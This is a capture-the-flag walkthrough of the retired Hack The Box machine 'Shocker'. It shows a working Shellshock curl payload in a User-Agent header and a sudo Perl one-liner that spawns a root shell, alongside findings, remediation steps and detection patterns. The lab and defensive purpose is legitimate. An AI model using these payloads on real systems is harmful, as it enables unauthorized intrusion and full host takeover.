Hack The Box / Easy / Linux

Shocker

A single exposed Apache CGI script at /cgi-bin/user.sh sits on top of an unpatched bash, making the host vulnerable to Shellshock (CVE-2014-6271). A crafted User-Agent header executes commands as the web user shelly with no authentication. From there a passwordless sudo entry for /usr/bin/perl converts the web shell into an instant root shell.

Retired machine · validated walkthrough · Authorized laboratory assessment · Reviewed: 2026-10-03

Dylan Senez / D4RKGUNN3R

Shellshock, CGI, sudo abuse, Perl, CVE-2014-6271

Case overview

Outcome

Shellshock gave unauthenticated command execution as shelly and the user.txt proof; sudo -l then exposed NOPASSWD: /usr/bin/perl, which was used to spawn a root shell and read root.txt. The host was fully compromised within minutes of the first HTTP request.

Key takeaway

Legacy CGI on an unpatched bash is enough to hand an attacker unauthenticated RCE, and a single NOPASSWD interpreter in sudoers turns any web shell into root.

Validated steps were directly reproduced. Documented steps are supported by preserved artifacts. Staged steps remain incomplete or await evidence.

Attack path

  • Full TCP sweep exposes Apache 2.4.18 on 80 and OpenSSH on 2222
  • Legacy CGI handler discovered at /cgi-bin/user.sh
  • Shellshock payload in the User-Agent header executes /usr/bin/id
  • Metasploit apache_mod_cgi_bash_env_exec returns a Meterpreter session as shelly
  • user.txt captured from /home/shelly
  • sudo -l reveals NOPASSWD: /usr/bin/perl
  • sudo perl spawns a root shell -> root.txt

1. Reconnaissance — Full TCP scan and service fingerprinting

Validated · Kali / attacker · EVD-001

Command / request

nmap -sV -sC -p- 192.0.2.10 -T4 --min-rate 5000

Observed result

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Analysis

Only HTTP and a non-standard SSH port are exposed on the target. Apache 2.4.18 on Ubuntu dates the stack to roughly 2016, which strongly suggests bash and its CGI handling may predate the Shellshock patches.

Why this mattered

Establishes the entire attack surface and gives a version baseline to target.

2. Reconnaissance — Identify the CGI endpoint under /cgi-bin/

Documented · Kali / attacker · EVD-002

Observed result

Requesting /cgi-bin/user.sh returns a shell script served with Content-Type: text/x-sh, confirming a CGI handler is present on the host.

Analysis

A shell-backed CGI script is precisely the surface Shellshock needs: bash evaluates environment variables (including the request User-Agent) before the script executes, so header content can become shell code.

Why this mattered

Locates the specific endpoint that turns the bash vulnerability into a reachable, unauthenticated attack.

3. Exploitation — Confirm Shellshock RCE with a manual request

Validated · Kali / attacker · EVD-003

Artifact

./evidence/EV-002-shellshock.txt

Command / request

curl -i -H 'User-Agent: () { :; }; echo; echo; /usr/bin/id' http://192.0.2.10/cgi-bin/user.sh

Observed result

HTTP/1.1 200 OK
Server: Apache/2.4.18 (Ubuntu)
Content-Type: text/x-sh

uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)

Analysis

The trailing function definition in the User-Agent header is parsed by bash, so /usr/bin/id runs before the CGI script and its output is returned in the response body. This is unauthenticated remote command execution as the shelly account.

Why this mattered

Proves exploitability with a single unauthenticated request, before introducing any tooling.

Observed result

[REDACTED]

Analysis

A Meterpreter session provides a reliable interactive channel as shelly, and reading /home/shelly/user.txt confirms a valid foothold rather than a one-shot injection.

Why this mattered

Converts the single-command injection into a usable shell for enumerated post-exploitation.

5. Internal Enumeration — Enumerate sudo rights for the web user

Validated · Kali / attacker (shelly shell) · EVD-005

Command / request

sudo -l

Observed result

User shelly may run the following commands on shocker:
    (root) NOPASSWD: /usr/bin/perl

Analysis

The compromised web user may run the Perl interpreter as root without a password. Any rule that exposes a general-purpose interpreter is functionally equivalent to granting root, since Perl can spawn an arbitrary shell.

Why this mattered

Reveals a direct, no-exploit path from the web shell to root.

6. Privilege Escalation — Use the Perl interpreter to obtain a root shell

Validated · Kali / attacker (shelly shell) · EVD-006

Artifact

root.txt (redacted)

Command / request

sudo /usr/bin/perl -e 'exec "/bin/sh";'
whoami
cat /root/root.txt

Observed result

root
[REDACTED]

Analysis

Executing /bin/sh through Perl runs under the privileges sudo granted the interpreter, landing a root shell. This is the documented GTFOBins pattern for interpreters left in NOPASSWD rules.

Why this mattered

Completes privilege escalation and produces the final root.txt proof.

Findings & remediation

F-1 — Shellshock RCE via a legacy CGI handler

High · Validated · http://192.0.2.10/cgi-bin/user.sh

Description

The host runs Apache 2.4.18 with a bash-backed CGI endpoint at /cgi-bin/user.sh on top of an unpatched bash. A crafted User-Agent header is parsed as a shell function definition, consistent with Shellshock (CVE-2014-6271 / CWE-78).

Impact

Unauthenticated remote command execution as the web user shelly (uid 1000), providing a foothold from which the host can be fully compromised.

Root cause

A legacy CGI handler invokes bash, which evaluates attack-controlled environment variables, and the underlying bash package was never patched against Shellshock.

Remediation

  • Remove or disable unused CGI handlers and never run bash-backed CGI
  • Patch bash against CVE-2014-6271 and CVE-2014-6278 and keep it current
  • Place any remaining CGI behind authentication and restrict it to trusted networks
  • Prefer a modern application server over CGI

Validation

  • A curl request with the Shellshock payload in the User-Agent header returned uid=1000(shelly) from /usr/bin/id, and a Metasploit session as shelly read user.txt.

F-2 — Passwordless sudo for the Perl interpreter

High · Validated · shocker (local privilege escalation from user shelly)

Description

sudo -l showed that shelly may run /usr/bin/perl as root with NOPASSWD. Perl can spawn an arbitrary shell, so the rule grants full root access without any exploit (CWE-250, execution with unnecessary privileges).

Impact

Full root compromise of the host, enabling credential theft, persistence, and data exfiltration.

Root cause

An over-broad sudoers entry grants a general-purpose interpreter, instead of the constrained, specific command actually required.

Remediation

  • Remove NOPASSWD for /usr/bin/perl and any other interpreter
  • If a privileged task is required, wrap it in a least-privilege command that enforces a constrained action
  • Audit sudoers regularly for interpreter rules (perl, python, bash) and remove them

Validation

  • sudo /usr/bin/perl -e 'exec "/bin/sh";' returned a shell as root (whoami -> root), after which /root/root.txt was read.

Analysis

Shocker is a clean illustration of how two independent misconfigurations compound. The web tier exposes a bash-backed CGI script, so an unpatched shell puts unauthenticated RCE on the perimeter; the local tier then places a general-purpose interpreter behind a passwordless sudo rule. Neither flaw needs a memory-corruption exploit or any credentials, and together they move from a single HTTP request to root without a single failed attempt.

Remediation

  • Remove or disable unused CGI handlers; never run bash-backed CGI
  • Patch bash against CVE-2014-6271 and CVE-2014-6278 and keep the package current
  • Delete NOPASSWD interpreter entries (perl, python, bash) from sudoers
  • Put any remaining CGI behind authentication and network restrictions
  • Prefer a modern application server or reverse proxy over CGI

Defender perspective

Shellshock leaves a very distinctive fingerprint: the payload itself travels inside an ordinary request header, so standard request logging captures the attack verbatim. Pair header/User-Agent anomaly detection with process-level monitoring of the web server, because the real risk is the child process the CGI handler spawns. On the host side, treat any NOPASSWD interpreter rule as a latent root path and audit sudoers for it proactively.

Detection opportunities

  • Alert on HTTP requests whose User-Agent contains shell metacharacters or the classic "() { :; };" function-definition pattern
  • Monitor access to /cgi-bin/ from unexpected or external sources
  • Watch for processes spawned by the web server user (id, cat, sh, perl)
  • Detect sudo invocations of interpreters such as /usr/bin/perl and flag sudoers rules that reference them

Lessons learned

  • Web shell access is often the start of the chain, not the end - always enumerate sudo immediately after a foothold
  • Legacy CGI is disproportionately dangerous because environment variables become shell input
  • NOPASSWD rules on interpreters are equivalent to handing out root; review them as such
  • Version banners (Apache 2.4.18, OpenSSH 7.2p2) were enough to predict the vulnerability class before any exploit was run

Open questions

  • The export does not record whether other CGI scripts besides user.sh were present on the host
  • The age of the NOPASSWD perl rule and how it came to be added were not captured during testing
